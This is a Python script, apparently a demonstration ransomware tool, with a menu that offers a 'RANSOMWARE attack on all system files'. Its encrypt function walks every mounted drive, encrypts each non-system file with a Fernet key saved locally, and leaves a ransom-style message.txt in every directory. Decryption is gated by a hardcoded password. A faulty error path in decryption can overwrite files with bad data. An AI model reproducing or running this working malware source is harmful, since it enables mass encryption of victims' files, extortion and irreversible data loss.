import os
from cryptography.fernet import Fernet
from tqdm import tqdm
from art import *
import time
import sys
import psutil

# ANSI escape codes for text colors
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

print("\n")
# Animated title
title = "RANSOMWARE   \nATTACK   "
title_art = text2art(title, font="standard", chr_ignore=True)
title_lines = title_art.split("\n")
title_width = len(max(title_lines, key=len))
star_line = "*" * (title_width + 2)

fade_in_duration = 0.5  # Duration for the fade-in effect in seconds
fade_in_steps = 30  # Number of steps for the fade-in effect

for step in range(fade_in_steps):
    os.system('cls' if os.name == 'nt' else 'clear')  # Clears the screen

    print("\n" * 2)  # Clears the screen

    print(star_line)
    for line in title_lines:
        faded_line = line[:int(step / fade_in_steps * len(line))]
        print(f"*{COLOR_MAGENTA}{faded_line.center(title_width)}{COLOR_RESET}*")  # Red color for the title
    print(star_line)

    time.sleep(fade_in_duration / fade_in_steps)

time.sleep(0.5)  # Pause for half a second

# List of operating system directories to skip during encryption and decryption
OS_DIRECTORIES = ["Windows", "Program Files", "Program Files (x86)", "ProgramData", "AppData"]

# List of file extensions to skip during encryption and decryption
OS_FILE_EXTENSIONS = [".exe", ".dll", ".sys", ".ini"]

# List of files to exclude from encryption and decryption
EXCLUDED_FILES = ["ransomware.py", "thekey.key", "ransomware.exe", "message.txt", "ransomware-whole-system.py", "ransomware-whole-system.exe"]

# Function to collect files from a directory, excluding certain directories, file extensions, and specific files
def get_all_files(path):
    all_files = []
    
    for root, dirs, filenames in os.walk(path):
        # Exclude OS directories
        dirs[:] = [d for d in dirs if d not in OS_DIRECTORIES]
        
        for file in filenames:
            # Exclude OS file extensions
            if any(file.lower().endswith(ext) for ext in OS_FILE_EXTENSIONS):
                continue
            
            # Exclude specific files
            if file in EXCLUDED_FILES:
                continue
            
            full_path = os.path.join(root, file)
            all_files.append(full_path)
    
    return all_files

# Function to display loading animation
def loading_animation():
    animation = "|/-\\"
    for i in range(10):
        time.sleep(0.1)
        sys.stdout.write("\r" + COLOR_CYAN + "Processing... " + animation[i % len(animation)] + COLOR_RESET)  # Cyan color for the loading animation
        sys.stdout.flush()

# Function to encrypt the files
def encrypt_files():
    drives = psutil.disk_partitions()
    all_files = []
    for drive in drives:
        drive_path = drive.mountpoint
        files_in_drive = get_all_files(drive_path)
        all_files.extend(files_in_drive)

    print(COLOR_YELLOW + "Encrypting files:" + COLOR_RESET)  # Yellow color for the message
    loading_animation()  # Call the loading animation
    with tqdm(total=len(all_files)) as pbar:
        key = Fernet.generate_key()

        with open("thekey.key", "wb") as thekey:
            thekey.write(key)

        for file in all_files:
            try:
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file, "wb") as thefile:
                    thefile.write(contents_encrypted)
                pbar.set_description(f"Encrypting {file}")
                time.sleep(0.1)
                pbar.update(1)
            except (PermissionError, FileNotFoundError) as e:
                print(f"{COLOR_RED}Failed to encrypt {file}: {str(e)}{COLOR_RESET}")

    # Create a message file in each directory
    for file in all_files:
        directory = os.path.dirname(file)
        message_file = os.path.join(directory, "message.txt")
        try:
            with open(message_file, "w") as file:
                file.write("This is an important message!\nYour files have been encrypted!")
        except PermissionError:
            print(f"{COLOR_RED}Permission denied: Could not create 'message.txt' in {directory}. Skipping...{COLOR_RESET}")

    print(COLOR_GREEN + "\nAll of your files have been encrypted, and a message has been left in each directory." + COLOR_RESET)


# Function to decrypt the files
def decrypt_files():
    drives = psutil.disk_partitions()
    all_files = []
    for drive in drives:
        drive_path = drive.mountpoint
        files_in_drive = get_all_files(drive_path)
        all_files.extend(files_in_drive)

    print(COLOR_YELLOW + "Decrypting files:" + COLOR_RESET)  # Yellow color for the message
    loading_animation()  # Call the loading animation
    with tqdm(total=len(all_files)) as pbar:
        with open("thekey.key", "rb") as key:
            secretkey = key.read()

        secretphrase = "Admin@123"

        user_phrase = input(COLOR_CYAN + "\nEnter the secret password to decrypt your files:\n" + COLOR_RESET)

        if user_phrase == secretphrase:
            for file in all_files:
                try:
                    with open(file, "rb") as thefile:
                        contents = thefile.read()
                    try:
                        contents_decrypted = Fernet(secretkey).decrypt(contents)
                    except Exception as e:
                        print(f"{COLOR_RED} Failed to decrypt {file}: {str(e)}{COLOR_RESET}")
                    with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                    pbar.set_description(f"Decrypting {file}")
                    time.sleep(0.1)
                    pbar.update(1)
                except (PermissionError, FileNotFoundError) as e:
                    print(f"{COLOR_RED}Failed to decrypt {file}: {str(e)}{COLOR_RESET}")

            # Delete the message.txt file in each directory
            for file in all_files:
                directory = os.path.dirname(file)
                message_file = os.path.join(directory, "message.txt")
                try:
                    os.remove(message_file)
                except FileNotFoundError:
                    print(f"{COLOR_RED}The file '{message_file}' does not exist or has already been deleted in {directory}{COLOR_RESET}")
            try:
                if os.path.isfile("thekey.key"):
                    os.remove("thekey.key")
            except (PermissionError, FileNotFoundError) as e:
                print(f"{COLOR_RED}Failed to delete 'thekey.key': {str(e)}{COLOR_RESET}")
            
            print("\n" + COLOR_GREEN + "Congrats, your files are decrypted. Enjoy!!" + COLOR_RESET)  # Green color for the success message
        else:
            print(COLOR_RED + "Sorry, wrong password." + COLOR_RESET)  # Red color for the error message


while True:
    print(COLOR_YELLOW + "\n\nPlease select an option from the list below:\n\n" + COLOR_RESET + COLOR_BLUE + "1. Do RANSOMWARE attack on all system files\n2. Decrypt the files\n3. Exit" + COLOR_RESET)
    print("\n\n")
    user_input = input(COLOR_YELLOW + "Enter your choice:\n" + COLOR_RESET)

    if user_input == str(1):
        encrypt_files()
    elif user_input == str(2):
        decrypt_files()
    elif user_input == str(3):
        exit()
    else:
        print("\n" + COLOR_RED + "Invalid input. Please enter a valid option." + COLOR_RESET)